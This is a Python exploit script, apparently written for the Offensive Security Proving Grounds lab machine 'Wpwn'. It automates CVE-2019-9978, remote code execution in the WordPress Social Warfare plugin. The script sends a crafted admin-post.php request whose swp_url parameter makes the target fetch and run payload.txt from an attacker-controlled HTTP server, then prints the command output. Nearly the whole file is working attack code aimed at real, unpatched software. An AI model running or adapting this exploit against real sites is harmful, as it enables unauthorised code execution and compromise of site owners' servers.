#!/usr/bin/python3

import requests
import pyfiglet
from colorama import Fore, Back, Style

# change this
http_ip = "192.168.49.158"
http_port = 8000
url = "http://192.168.158.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{0}:{1}/payload.txt".format(http_ip,http_port)

def banner(text="autopwn"):
    print(Fore.YELLOW + pyfiglet.figlet_format(text, font="banner"))
    print(Fore.GREEN + "[+] Author: @dugisan3rd")
    print("[+] Medium: Offensive Security Proving Ground")
    print("[+] Link: https://portal.offensive-security.com/proving-grounds/play")
    print("[+] Machine: Wpwn")
    print("[+] Vulnerability: CVE-2019-9978: WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution\n" + Style.RESET_ALL)

# up webserver
# $ python2 -m SimpleHTTPServer

if __name__ == "__main__":
    banner()
    r = requests.get(url)
    output = r.text.split("<")
    print(Fore.RED + "[+] Output: {0} {1}".format(Style.RESET_ALL,output[0]))